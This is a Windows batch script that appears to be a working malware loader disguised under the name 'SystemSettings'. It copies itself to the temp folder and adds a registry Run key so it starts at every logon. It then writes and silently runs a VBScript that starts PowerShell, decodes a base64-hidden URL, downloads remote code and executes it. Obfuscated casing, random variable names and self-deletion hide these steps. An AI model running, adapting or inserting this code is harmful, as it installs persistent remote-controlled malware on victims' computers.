��&cls
@eCHo off
sET RspPmtAg=SystemSettings.bat
sEt tZGHpwMB=%TEMP%\SystemSettings.bat
dEl /f /q "%tZGHpwMB%" >nul 2>&1
COpY /Y "%~f0" "%tZGHpwMB%" >nul
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemSettings" /f >nul 2>&1
reG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemSettings" /d "\"%tZGHpwMB%\"" /f >nul
sEt CngcppYi=%TEMP%\JzPHyChmogBW.vbs
echo on ERROr ReSumE neXt > "%CngcppYi%"
echo dIM slnaGXae, AKKCptyp >> "%CngcppYi%"
echo diM GSBqmX : geURki = 79 >> "%CngcppYi%"
echo wScrIPt.sLEEP 1197 >> "%CngcppYi%"
echo CREATeOBJect("wSCriPt.SheLl").run "pOWeRshEll $u=[sYstem.TExt.ENcoDING]::UTF8.GetStRInG([sYsteM.convERT]::froMBAsE64StRINg('aHR0cHM6Ly93d3cuY2FkZWNvLW14LmNvL3VybC5wZGY='));IeX([SYsTeM.IO.STReAMrEadER]::NeW([sYSteM.NET.WebrEQuEST]::CREATE($u).GETReSpoNsE().gETRESPONseStrEAM()).rEaDtOEND())", 0, False >> "%CngcppYi%"
start /b /wait wscript "%CngcppYi%"
del "%CngcppYi%" /f /q
exit
